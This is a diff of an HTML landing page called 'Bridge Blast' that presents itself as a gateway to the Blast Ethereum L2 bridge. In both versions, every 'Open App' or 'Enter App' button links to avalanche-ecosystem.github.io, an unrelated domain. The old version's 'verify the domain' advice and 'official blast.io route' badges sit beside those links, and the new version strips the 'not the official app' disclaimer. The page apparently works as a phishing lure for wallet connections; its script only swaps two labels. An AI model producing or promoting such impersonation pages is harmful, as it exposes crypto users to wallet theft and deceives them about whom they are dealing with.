@@ -1,47 +1,114 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Bridge Blast - Open App</title><meta name="description" content="bridge blast opens the official Blast bridge so you can move ETH to Blast Mainnet, connect a wallet, and verify the domain first.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://bridge-blast.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Bridge Blast - Open App"><meta property="og:description" content="bridge blast opens the official Blast bridge so you can move ETH to Blast Mainnet, connect a wallet, and verify the domain first.">
-<meta property="og:url" content="https://bridge-blast.github.io/"><meta property="og:image" content="https://bridge-blast.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Bridge Blast - Open App"><meta name="twitter:description" content="bridge blast opens the official Blast bridge so you can move ETH to Blast Mainnet, connect a wallet, and verify the domain first."><meta name="twitter:image" content="https://bridge-blast.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://bridge-blast.github.io/#website", "url": "https://bridge-blast.github.io/", "name": "Bridge Blast"}, {"@type": "WebPage", "@id": "https://bridge-blast.github.io/#webpage", "url": "https://bridge-blast.github.io/", "name": "Bridge Blast - Open App", "description": "bridge blast opens the official Blast bridge so you can move ETH to Blast Mainnet, connect a wallet, and verify the domain first.", "inLanguage": "en", "isPartOf": {"@id": "https://bridge-blast.github.io/#website"}}, {"@type": "Organization", "@id": "https://bridge-blast.github.io/#org", "name": "Bridge Blast", "url": "https://bridge-blast.github.io/", "logo": "https://bridge-blast.github.io/og-cover.png", "sameAs": ["https://x.com/Blast_L2", "https://github.com/blast-io", "https://defillama.com/chain/Blast"]}, {"@type": "WebApplication", "@id": "https://bridge-blast.github.io/#app", "name": "Bridge Blast", "url": "https://bridge-blast.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "bridge blast opens the official Blast bridge so you can move ETH to Blast Mainnet, connect a wallet, and verify the domain first.", "featureList": ["Official blast.io route", "Blast Mainnet chain ID 81457", "Blastscan explorer"], "isPartOf": {"@id": "https://bridge-blast.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://bridge-blast.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is the official Blast bridge?", "acceptedAnswer": {"@type": "Answer", "text": "The official Blast bridge is hosted by Blast and lets users move supported assets between Ethereum and Blast. The Blast app route is the safest starting point for confirming the current bridge domain and supported assets. Users may also see third-party bridge routes, but those are separate services with their own fees, liquidity, and risk assumptions. Always confirm the URL before connecting a wallet."}}, {"@type": "Question", "name": "What token pays gas on Blast?", "acceptedAnswer": {"@type": "Answer", "text": "Blast uses ETH for gas. After bridging to Blast, keep a small ETH balance on the Blast network to pay for swaps, approvals, claims, NFT transactions, and withdrawals, and use Blastscan to review Blast Mainnet activity. ETH on Ethereum mainnet cannot pay Blast gas until it is bridged or otherwise moved to Blast. If a wallet has tokens but transactions fail, missing Blast ETH is a common cause."}}, {"@type": "Question", "name": "Can I bridge USDB or BLAST from Blast to Ethereum?", "acceptedAnswer": {"@type": "Answer", "text": "Availability depends on the official bridge and third-party routes at the time of transfer. CoinGecko's BLAST market profile is useful context for the BLAST asset, but route support still depends on the bridge path. USDB, BLAST, ETH, and other Blast assets may have different withdrawal paths, exchange support, and liquidity. Before bridging out, check the destination token contract, whether the receiving exchange or app accepts it, and the expected settlement time. For large amounts, test a smaller transfer first."}}, {"@type": "Question", "name": "Why is my Blast bridge transaction pending?", "acceptedAnswer": {"@type": "Answer", "text": "A pending Blast bridge transaction may be waiting for Ethereum confirmation, L2 processing, a relayer step, liquidity availability, or a withdrawal finality window. L2BEAT's Blast risk analysis is useful background for withdrawal and bridge assumptions. Check the source transaction hash first, then the destination wallet on a Blast explorer or the bridge status page. If using a third-party bridge, use that provider's status tool because the official Blast bridge may not track external routes."}}, {"@type": "Question", "name": "Is bridging to Blast reversible?", "acceptedAnswer": {"@type": "Answer", "text": "A completed bridge transfer cannot be simply reversed like a card payment. Investopedia's cross-chain bridge overview explains why bridge apps have their own security and operational risks. To move funds back, users must start a new bridge transaction from Blast to Ethereum or another supported destination. That outbound route may have different fees and timing from the inbound deposit. Always verify destination chain, token, and wallet address before signing the original bridge transaction."}}, {"@type": "Question", "name": "Does Blast have a native token?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, Blast has the BLAST ecosystem token, while ETH remains the gas token used for network transactions. CoinMarketCap's BLAST profile is a separate market-data reference for the token. Holding BLAST is not required to pay gas on Blast, but it may be relevant for ecosystem incentives, governance, or app-specific programs. When bridging, distinguish between BLAST as an asset and ETH as the operational token needed for transaction fees."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Bridge Blast"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Bridge Blast</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Bridge Blast</h1>
-      <div class="bridge-widget" role="group" aria-label="Bridge Blast preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>ETH</b> · Blast Mainnet</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Bridge Blast ↗</a></div>
-      <p class="hero-note">Live preview — open the official Bridge Blast app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official blast.io route</span><span class="trust-chip">Blast Mainnet chain ID 81457</span><span class="trust-chip">Blastscan explorer</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Bridge Blast?</h2><div class="capsule"><strong>Bridge Blast</strong> is an app-first guide to the official Blast bridge for moving assets between Ethereum and Blast Mainnet. Blast is an EVM-compatible optimistic rollup with native yield for ETH and stablecoins, as described in the <a class="inline-link" href="https://docs.blast.io/about-blast" rel="noopener noreferrer">Blast architecture overview</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Bridge Blast at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Ethereum Layer 2 bridge</b></div><div class="f"><small>Network</small><b>Blast</b></div><div class="f"><small>Token</small><b>ETH for gas; BLAST ecosystem token</b></div><div class="f"><small>Launched</small><b>2024</b></div><div class="f"><small>Custody</small><b>Non-custodial bridge contracts with L2 bridge assumptions</b></div></div><div class="intent-a">For independent ecosystem context, the <a class="inline-link" href="https://defillama.com/chain/Blast" rel="noopener noreferrer">DeFiLlama Blast chain page</a> tracks the network alongside other DeFi chains without changing the transfer steps shown here.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Bridge to Blast from Ethereum</h2><div class="intent-a">Bridging to Blast from Ethereum moves ETH or supported assets from Ethereum mainnet to the Blast L2 network. Users connect a wallet, choose Ethereum as source, select Blast as destination, review fees, and sign the deposit. Ethereum gas is paid on the source transaction, and Blast activity requires ETH for L2 gas. Ethereum.org's <a class="inline-link" href="https://ethereum.org/layer-2/" rel="noopener noreferrer">layer 2 explainer</a> is useful background for why networks built on Ethereum use separate execution environments. Third-party bridges may offer faster routing or more assets, but their liquidity and trust assumptions differ from the official bridge.</div></div></section><section class="section"><div class="container"><h2>Blast bridge withdrawal time</h2><div class="intent-a">Blast withdrawals from L2 to Ethereum can take longer than deposits because optimistic-rollup-style exits include finality and challenge-period assumptions. Ethereum.org's <a class="inline-link" href="https://ethereum.org/developers/docs/scaling/optimistic-rollups/" rel="noopener noreferrer">optimistic rollup guide</a> explains the design pattern behind these exit assumptions. Third-party bridges may offer faster liquidity-based exits, but they charge route-specific fees and depend on available liquidity. Users should distinguish between official withdrawal settlement and a fast bridge quote. For large withdrawals, check the expected arrival time, destination token, and whether the route is a canonical exit or a liquidity bridge. Keep enough ETH on Blast to pay the transaction that starts the withdrawal.</div></div></section><section class="section section-alt"><div class="container"><h2>Blast bridge fees and gas</h2><div class="intent-a">Blast bridge fees depend on direction and route. Depositing from Ethereum requires Ethereum gas, and interacting on Blast requires ETH as the L2 gas token. The Blast <a class="inline-link" href="https://docs.blast.io/building/network-information" rel="noopener noreferrer">network information page</a> lists Blast Mainnet's chain ID and ETH currency symbol. A third-party bridge may add liquidity fees, relayer costs, or slippage if the route swaps assets. The best comparison is the final received amount and expected arrival time, not just the advertised network fee. During high Ethereum gas periods, deposits from mainnet may cost much more than normal Blast transactions after funds have arrived.</div></div></section>
-<section class="section"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b>Compare route cost, arrival time, and received amount; <a class="inline-link" href="https://www.investopedia.com/what-are-cross-chain-bridges-6750848" rel="noopener noreferrer">cross-chain bridge mechanics</a> can vary by provider. On-chain actions are irreversible, and this is not financial advice.</b></div><div class="f"><small>Custody</small><b>Bridge contracts and L2 exits rely on specific trust assumptions; review the <a class="inline-link" href="https://l2beat.com/scaling/projects/blast" rel="noopener noreferrer">L2BEAT Blast risk summary</a> before large transfers. On-chain actions are irreversible, and this is not financial advice.</b></div><div class="f"><small>Security</small><b>Verify domains, wallet prompts, token addresses, and route ownership because <a class="inline-link" href="https://www.wired.com/story/blockchain-network-bridge-hacks/" rel="noopener noreferrer">bridge exploit reporting</a> shows bridges can be attractive targets. On-chain actions are irreversible, and this is not financial advice.</b></div></div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Bridge Blast</h2><ol class="steps"><li><b>Open the official route</b><span>Use the <a class="inline-link" href="https://blast.io/en/bridge" rel="noopener noreferrer">Blast bridge app</a> and confirm the blast.io domain before connecting a wallet.</span></li><li><b>Connect wallet</b><span>Choose the wallet that holds ETH on Ethereum or the account you use on Blast Mainnet.</span></li><li><b>Choose direction</b><span>Use Deposit to move ETH to Blast Mainnet or Withdraw to send funds back to Ethereum.</span></li><li><b>Review and sign</b><span>Check token, network, amount, and wallet prompts before approving any transaction.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official Bridge Blast app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Bridge Blast ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Blast bridge vs Base bridge</h2><div class="intent-a">Base maintains separate <a class="inline-link" href="https://docs.base.org/base-chain/network-information/bridges" rel="noopener noreferrer">Base bridge documentation</a>, which is a reminder to use the bridge route for the specific destination network rather than treating all Ethereum L2 bridges as interchangeable.</div><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Blast bridge</th><th>Base bridge</th></tr></thead><tbody><tr><td>Destination network</td><td>Blast</td><td>Base</td></tr><tr><td>Gas token</td><td>ETH</td><td>ETH</td></tr><tr><td>Search driver</td><td>Blast apps, yield narrative, BLAST ecosystem</td><td>Coinbase ecosystem, Base apps, low-cost L2 activity</td></tr><tr><td>Exit choice</td><td>Official bridge or third-party liquidity routes</td><td>Official/superchain bridge routes or third-party bridges</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Bridge Blast FAQ</h2><div class="faq-list"><details open><summary><h3>What is the official Blast bridge?</h3></summary><div>The official Blast bridge is hosted by Blast and lets users move supported assets between Ethereum and Blast. The <a class="inline-link" href="https://blast.io/en/bridge" rel="noopener noreferrer">Blast app route</a> is the safest starting point for confirming the current bridge domain and supported assets. Users may also see third-party bridge routes, but those are separate services with their own fees, liquidity, and risk assumptions. Always confirm the URL before connecting a wallet.</div></details><details><summary><h3>What token pays gas on Blast?</h3></summary><div>Blast uses ETH for gas. After bridging to Blast, keep a small ETH balance on the Blast network to pay for swaps, approvals, claims, NFT transactions, and withdrawals, and use <a class="inline-link" href="https://blastscan.io/" rel="noopener noreferrer">Blastscan</a> to review Blast Mainnet activity. ETH on Ethereum mainnet cannot pay Blast gas until it is bridged or otherwise moved to Blast. If a wallet has tokens but transactions fail, missing Blast ETH is a common cause.</div></details><details><summary><h3>Can I bridge USDB or BLAST from Blast to Ethereum?</h3></summary><div>Availability depends on the official bridge and third-party routes at the time of transfer. CoinGecko's <a class="inline-link" href="https://www.coingecko.com/en/coins/blast" rel="noopener noreferrer">BLAST market profile</a> is useful context for the BLAST asset, but route support still depends on the bridge path. USDB, BLAST, ETH, and other Blast assets may have different withdrawal paths, exchange support, and liquidity. Before bridging out, check the destination token contract, whether the receiving exchange or app accepts it, and the expected settlement time. For large amounts, test a smaller transfer first.</div></details><details><summary><h3>Why is my Blast bridge transaction pending?</h3></summary><div>A pending Blast bridge transaction may be waiting for Ethereum confirmation, L2 processing, a relayer step, liquidity availability, or a withdrawal finality window. L2BEAT's <a class="inline-link" href="https://l2beat.com/scaling/projects/blast" rel="noopener noreferrer">Blast risk analysis</a> is useful background for withdrawal and bridge assumptions. Check the source transaction hash first, then the destination wallet on a Blast explorer or the bridge status page. If using a third-party bridge, use that provider's status tool because the official Blast bridge may not track external routes.</div></details><details><summary><h3>Is bridging to Blast reversible?</h3></summary><div>A completed bridge transfer cannot be simply reversed like a card payment. Investopedia's <a class="inline-link" href="https://www.investopedia.com/what-are-cross-chain-bridges-6750848" rel="noopener noreferrer">cross-chain bridge overview</a> explains why bridge apps have their own security and operational risks. To move funds back, users must start a new bridge transaction from Blast to Ethereum or another supported destination. That outbound route may have different fees and timing from the inbound deposit. Always verify destination chain, token, and wallet address before signing the original bridge transaction.</div></details><details><summary><h3>Does Blast have a native token?</h3></summary><div>Yes, Blast has the BLAST ecosystem token, while ETH remains the gas token used for network transactions. CoinMarketCap's <a class="inline-link" href="https://coinmarketcap.com/currencies/blast/" rel="noopener noreferrer">BLAST token profile</a> is a separate market-data reference for the token. Holding BLAST is not required to pay gas on Blast, but it may be relevant for ecosystem incentives, governance, or app-specific programs. When bridging, distinguish between BLAST as an asset and ETH as the operational token needed for transaction fees.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Bridge Blast is not the official app; verify blast.io before connecting; educational information only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Bridge Blast</title>
+  <meta name="description" content="Bridge Blast moves ETH and tokens between Ethereum and the Blast L2 from your own wallet.">
+  <link rel="canonical" href="https://bridge-blast.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F6F4ED">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Bridge Blast">
+  <meta property="og:description" content="Bridge Blast moves ETH and tokens between Ethereum and the Blast L2 from your own wallet.">
+  <meta property="og:url" content="https://bridge-blast.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bridge Blast">
+  <meta name="twitter:description" content="Bridge Blast moves ETH and tokens between Ethereum and the Blast L2 from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://bridge-blast.github.io/#website",
+        "url": "https://bridge-blast.github.io/",
+        "name": "Bridge Blast",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://bridge-blast.github.io/#app",
+        "name": "Bridge Blast",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://bridge-blast.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://bridge-blast.github.io/#organization",
+        "name": "Bridge Blast",
+        "url": "https://bridge-blast.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Bridge Blast home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Bridge Blast</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+      <a href="https://l2beat.com/scaling/projects/blast" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Bridge Blast</h1>
+      <p class="value"><strong>Bridge Blast</strong> moves ETH and tokens between Ethereum and the Blast L2 from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="32" height="32" alt="">
+            <span>Ethereum</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+          <span aria-hidden="true">→</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="blast.png" width="32" height="32" alt="">
+            <span>Blast</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Bridge Blast &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
